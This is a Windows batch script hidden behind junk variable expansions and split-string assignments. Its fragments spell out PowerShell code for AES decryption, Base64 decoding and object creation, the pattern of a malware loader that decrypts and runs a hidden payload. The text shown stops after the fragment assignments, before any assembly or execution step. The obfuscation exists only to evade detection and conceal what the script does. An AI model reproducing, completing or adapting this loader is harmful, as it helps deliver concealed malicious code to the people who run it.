@echo off
%sztZUXzZJREqLzzuREgI%s%sztZUXzZJREqLzzuREgI%e%sztZUXzZJREqLzzuREgI%t%sztZUXzZJREqLzzuREgI%l%sztZUXzZJREqLzzuREgI%o%sztZUXzZJREqLzzuREgI%c%sztZUXzZJREqLzzuREgI%a%sztZUXzZJREqLzzuREgI%l%sztZUXzZJREqLzzuREgI% %sztZUXzZJREqLzzuREgI%e%sztZUXzZJREqLzzuREgI%n%sztZUXzZJREqLzzuREgI%a%sztZUXzZJREqLzzuREgI%b%sztZUXzZJREqLzzuREgI%l%sztZUXzZJREqLzzuREgI%e%sztZUXzZJREqLzzuREgI%d%sztZUXzZJREqLzzuREgI%e%sztZUXzZJREqLzzuREgI%l%sztZUXzZJREqLzzuREgI%a%sztZUXzZJREqLzzuREgI%y%sztZUXzZJREqLzzuREgI%e%sztZUXzZJREqLzzuREgI%d%sztZUXzZJREqLzzuREgI%e%sztZUXzZJREqLzzuREgI%x%sztZUXzZJREqLzzuREgI%p%sztZUXzZJREqLzzuREgI%a%sztZUXzZJREqLzzuREgI%n%sztZUXzZJREqLzzuREgI%s%sztZUXzZJREqLzzuREgI%i%sztZUXzZJREqLzzuREgI%o%sztZUXzZJREqLzzuREgI%n%sztZUXzZJREqLzzuREgI%
set "TiRAkgnNmADCeBtWHBWh=s"
set "dyrntCxppMUGChACtHYJ=t"
set "lswiUaCvvUWZDtqfGQkn=!TiRAkgnNmADCeBtWHBWh!e!dyrntCxppMUGChACtHYJ!"
!lswiUaCvvUWZDtqfGQkn! "nzKSbItJLA=RLT "
!lswiUaCvvUWZDtqfGQkn! "jwkIiAGNwp=aphy"
!lswiUaCvvUWZDtqfGQkn! "KexeocubtX=pkKt"
!lswiUaCvvUWZDtqfGQkn! "svWZCwXiaz=tem."
!lswiUaCvvUWZDtqfGQkn! "FRduLjlVJI=Cryp"
!lswiUaCvvUWZDtqfGQkn! "YIZVzJGhgv=oryS"
!lswiUaCvvUWZDtqfGQkn! "oQGFgTXVjo=n $p"
!lswiUaCvvUWZDtqfGQkn! "VxgzFBwjvu=;	}}"
!lswiUaCvvUWZDtqfGQkn! "VIsmAKsBZd=d1_v"
!lswiUaCvvUWZDtqfGQkn! "FhrUKAsmIr=var)"
!lswiUaCvvUWZDtqfGQkn! "UZnzrTRnod=New-"
!lswiUaCvvUWZDtqfGQkn! "TjmtFQJmcN=nMod"
!lswiUaCvvUWZDtqfGQkn! "fvcHLkcFTw=6] -"
!lswiUaCvvUWZDtqfGQkn! "vssVimBleU=join"
!lswiUaCvvUWZDtqfGQkn! "lXmYrboCCP=orF'"
!lswiUaCvvUWZDtqfGQkn! "gJRrEkbPXU=nirt"
!lswiUaCvvUWZDtqfGQkn! "GrwqoMrEWy=rF'["
!lswiUaCvvUWZDtqfGQkn! "ptNYdrPafj=s_fu"
!lswiUaCvvUWZDtqfGQkn! "AXwBNJQOrI=ds_v"
!lswiUaCvvUWZDtqfGQkn! "ltjxoRuVNF=($pa"
!lswiUaCvvUWZDtqfGQkn! "CNSNXUEehj=($pa"
!lswiUaCvvUWZDtqfGQkn! "dUaSUDWGca=ect "
!lswiUaCvvUWZDtqfGQkn! "UCarwWoAwE=retu"
!lswiUaCvvUWZDtqfGQkn! "yPAAEDhxyD=th('"
!lswiUaCvvUWZDtqfGQkn! "ErUKCofeYv=t]::"
!lswiUaCvvUWZDtqfGQkn! "txrZJdAFSn=ssio"
!lswiUaCvvUWZDtqfGQkn! "cgWvLXnYeh=:: '"
!lswiUaCvvUWZDtqfGQkn! "VfgNqgVCJB=7;	$"
!lswiUaCvvUWZDtqfGQkn! "whOeLmTxXf=ar.I"
!lswiUaCvvUWZDtqfGQkn! "JrcZRsrYCK=am_v"
!lswiUaCvvUWZDtqfGQkn! "PBOtPfYHrR=[Sys"
!lswiUaCvvUWZDtqfGQkn! "vbgfsxzQCO=gMod"
!lswiUaCvvUWZDtqfGQkn! "UOkgMJDlSx=uG7w"
!lswiUaCvvUWZDtqfGQkn! "IAeUlUJJeq=	$ae"
!lswiUaCvvUWZDtqfGQkn! "txCsinEeVA=ddin"
!lswiUaCvvUWZDtqfGQkn! "lYdwrIonmB=oin "
!lswiUaCvvUWZDtqfGQkn! "SnpAqbdjAx=.Raw"
!lswiUaCvvUWZDtqfGQkn! "TvRTbqIPSR=));"
!lswiUaCvvUWZDtqfGQkn! "KOpoussWEe=Syst"
!lswiUaCvvUWZDtqfGQkn! "ORaIlUKxIo=);	$"
